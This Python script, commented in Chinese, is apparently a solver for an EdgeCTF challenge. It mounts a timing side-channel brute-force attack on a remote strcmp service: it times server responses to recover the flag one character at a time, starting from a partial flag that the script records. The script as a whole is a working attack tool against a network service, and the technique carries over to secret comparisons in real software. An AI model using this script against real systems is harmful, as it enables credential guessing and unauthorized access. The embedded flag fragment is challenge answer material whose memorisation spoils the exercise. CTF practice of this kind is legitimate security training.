#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
继续时间侧信道攻击，从已知的部分flag开始
"""

import socket
import time
import string
import statistics

def connect_to_server():
    """连接到远程服务器"""
    host = "strcmp.chall.edgesecurity.team"
    port = 1341
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        return sock
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return None

def measure_response_time_precise(test_string, num_samples=10):
    """精确测量响应时间"""
    times = []
    successful_measurements = 0
    
    for attempt in range(num_samples * 2):
        if successful_measurements >= num_samples:
            break
            
        sock = connect_to_server()
        if not sock:
            continue
            
        try:
            # 清理初始状态
            sock.settimeout(0.5)
            try:
                initial = sock.recv(4096)
            except socket.timeout:
                pass
            
            # 准备发送数据
            data = (test_string + "\n").encode('utf-8')
            
            # 使用更精确的时间测量
            start_time = time.perf_counter()
            sock.send(data)
            
            try:
                sock.settimeout(2.0)
                response = sock.recv(4096)
            except socket.timeout:
                response = b""
            
            end_time = time.perf_counter()
            elapsed = end_time - start_time
            times.append(elapsed)
            successful_measurements += 1
            
        except Exception as e:
            continue
        finally:
            sock.close()
        
        time.sleep(0.05)
    
    if times and len(times) >= 3:
        # 去掉异常值
        times_sorted = sorted(times)
        times = times_sorted[1:-1]
        
        avg_time = statistics.mean(times)
        return avg_time
    elif times:
        return statistics.mean(times)
    return 0

def continue_bruteforce_from(base_flag):
    """从指定的base flag继续爆破"""
    print(f"从 '{base_flag}' 继续爆破...")
    
    current_flag = base_flag
    charset = string.ascii_letters + string.digits + "_-!@#$%^&*()+=[]{}|;:,.<>?"
    
    max_additional_chars = 10  # 最多再尝试10个字符
    
    for pos in range(len(current_flag), len(current_flag) + max_additional_chars):
        print(f"\n正在爆破位置 {pos} (当前: '{current_flag}')")
        
        char_results = {}
        
        # 测试每个字符
        for i, char in enumerate(charset):
            test_string = current_flag + char
            avg_time = measure_response_time_precise(test_string, num_samples=8)
            char_results[char] = avg_time
            
            # 实时显示进度
            progress = (i + 1) / len(charset) * 100
            print(f"  进度: {progress:.1f}% - '{char}': {avg_time:.6f}s", end="\r")
        
        print()  # 换行
        
        # 分析结果
        sorted_chars = sorted(char_results.items(), key=lambda x: x[1], reverse=True)
        
        print("前5个候选:")
        for i, (char, avg_time) in enumerate(sorted_chars[:5], 1):
            print(f"  {i}. '{char}': {avg_time:.6f}s")
        
        # 选择最佳字符
        best_char = sorted_chars[0][0]
        best_time = sorted_chars[0][1]
        second_best_time = sorted_chars[1][1] if len(sorted_chars) > 1 else 0
        
        # 检查时间差异
        time_difference = best_time - second_best_time
        print(f"  时间差异: {time_difference:.6f}s")
        
        # 如果时间差异太小，可能已经到达flag末尾
        if time_difference < 0.0002:
            print("  时间差异很小，可能已到达flag末尾")
            break
        
        current_flag += best_char
        print(f"  选择: '{best_char}' -> 当前flag: '{current_flag}'")
        
        # 如果找到结束符
        if best_char == '}':
            print(f"\n找到完整flag: {current_flag}")
            break
    
    return current_flag

def test_complete_flag(flag):
    """测试完整的flag"""
    print(f"\n=== 测试完整flag: {flag} ===")
    
    sock = connect_to_server()
    if not sock:
        return
    
    try:
        # 获取初始提示
        sock.settimeout(2)
        try:
            initial = sock.recv(4096)
            print(f"服务器提示: {initial.decode()}")
        except:
            pass
        
        # 发送flag
        print(f"发送flag: {flag}")
        sock.send((flag + "\n").encode('utf-8'))
        
        # 获取响应
        try:
            sock.settimeout(5)
            response = sock.recv(4096)
            print(f"服务器响应: {response.decode()}")
            
            # 检查是否还有更多响应
            try:
                sock.settimeout(1)
                more_response = sock.recv(4096)
                if more_response:
                    print(f"额外响应: {more_response.decode()}")
            except socket.timeout:
                pass
            
        except Exception as e:
            print(f"接收响应时出错: {e}")
    
    finally:
        sock.close()

if __name__ == "__main__":
    print("继续时间侧信道攻击")
    print("=" * 50)
    
    # 从验证脚本得到的最佳候选
    base_flag = "EdgeCTF{fSwP0Ifi6LoY25WLh69P6T3UaBVW3IOUA"
    
    # 继续爆破
    complete_flag = continue_bruteforce_from(base_flag)
    
    # 测试完整flag
    test_complete_flag(complete_flag)
    
    # 如果没有以}结尾，手动添加}测试
    if not complete_flag.endswith('}'):
        print(f"\n尝试添加 '}}': {complete_flag}}}")
        test_complete_flag(complete_flag + "}")
    
    print(f"\n最终flag: {complete_flag}")